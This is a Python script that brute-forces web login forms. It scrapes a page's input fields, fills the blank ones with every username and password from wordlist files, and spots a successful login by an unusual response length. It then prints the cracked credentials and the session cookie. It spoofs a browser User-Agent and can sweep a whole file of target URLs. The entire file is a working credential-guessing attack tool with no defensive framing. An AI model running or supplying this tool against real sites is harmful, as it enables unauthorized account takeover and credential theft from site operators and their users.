import requests
import argparse
import json
import requests.utils
from bs4 import BeautifulSoup

def get_dict(file_name):

    list = []
    with open(file_name, 'r', encoding='utf-8') as f:
        for i in f.readlines():
            list.append(i.strip())
    f.close()
    return list

def get_cookie(session, u, payload):
    response = session.post(u, data=payload, headers=headers, allow_redirects=False)
    cookie = response.cookies
    cookie_dict = requests.utils.dict_from_cookiejar(cookie)
    # print(cookie_dict)
    return cookie_dict

def get_params(url, session):
    param_name = []
    default_value = []
    response = session.get(url, headers=headers)
    response.encoding = 'utf-8'
    soup = BeautifulSoup(response.text, 'html.parser')
    params = soup.find_all('input')
    for param in params:
        param_name.append(param.get('name'))
        default_value.append(param.get('value'))
    print(param_name,default_value)
    return param_name, default_value

def get_url_list(filename):
    url_list = []
    with open(filename, 'r', encoding='utf-8') as f:
        for i in f.readlines():
            url_list.append(i.strip())
    f.close()
    return url_list

mark = 0
parser = argparse.ArgumentParser()
parser.add_argument('-u', type=str, default=None, required=False)
parser.add_argument('-f', type=str, default=None, required=False)
args = parser.parse_args()

#伪造火狐的UA
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36',
}


session = requests.Session()
print("[*] Loading names...")
names = get_dict("namelist.txt")
print("[*] Loading passwords...")
passwords = get_dict('password.txt')
if args.u == None and args.f == None:
    print("Please input url or file")
    exit()

if args.u != None:
    len_list = []
    ppp = []
    url = args.u
    print("[*] Loading url...")
    param_name_list, default_value_list = get_params(url, session)
    dic = {}
    empty_key = []
    for param, value in zip(param_name_list, default_value_list):
        if value == '' or value is None:
            empty_key.append(param)
        dic[param] = value
    print("[*] Starting brute force attack...")
    for name in names:
        for password in passwords:
            ts = [name,password]
            for key,t in zip(empty_key,ts):
                dic[key] = t
            payload = dic
            ppp.append(payload)
            response = session.post(url, data=payload, headers=headers, allow_redirects=False)
            content_length = len(response.content)
            len_list.append(content_length)
    min_len = min(len_list)
    min_index = len_list.index(min_len)
    max_len = max(len_list)
    max_index = len_list.index(max_len)

    if len_list.count(min_len) == 1:
        print("[*] Success")
        print("The username is: "+str(names[min_index // len(passwords)])+"\n"+"The password is: "+str(passwords[min_index % len(passwords)]))
        # print(ppp[min_index])
        print("Cookie: \n" ,get_cookie(session, url, ppp[min_index]))
    elif len_list.count(max_len) == 1:
        print("[*] Success")
        print("The username is: " + str(names[max_index // len(passwords)]) + "\n" + "The password is: " + str(passwords[max_index % len(passwords)]))
        # print(ppp[max_index])
        print("Cookie: \n" ,get_cookie(session, url, ppp[max_index]))
    else:
        print("[*] Result")
        print("No Vulnerable")


elif args.f != None:
    url_list = get_url_list(args.f)
    for url in url_list:
        len_list = []

        ppp = []
        print("Testing url: "+url)
        param_name_list, default_value_list = get_params(url, session)
        dic = {}
        empty_key = []
        for param, value in zip(param_name_list, default_value_list):
            if value == '' or value is None:
                empty_key.append(param)
            dic[param] = value
        print("[*] Starting brute force attack...")
        for name in names:
            for password in passwords:
                ts = [name,password]
                for key,t in zip(empty_key,ts):
                    dic[key] = t
                payload = dic
                ppp.append(payload)
                response = session.post(url, data=payload, headers=headers, allow_redirects=False)
                content_length = len(response.content)
                len_list.append(content_length)
        min_len = min(len_list)
        min_index = len_list.index(min_len)
        max_len = max(len_list)
        max_index = len_list.index(max_len)
        if len_list.count(min_len) == 1:
            print("[*] Success")
            print("The username is: "+str(names[min_index // len(passwords)])+"\n"+"The password is: "+str(passwords[min_index % len(passwords)]))
            print("Cookie: \n" ,get_cookie(session, url, ppp[min_index]))
        elif len_list.count(max_len) == 1:
            print("[*] Success")
            print("The username is: " + str(names[max_index // len(passwords)]) + "\n" + "The password is: " + str(passwords[max_index % len(passwords)]))
            print("Cookie: \n" ,get_cookie(session, url, ppp[max_index]))
        else:
            print("[*] Result")
            print("No Vulnerable")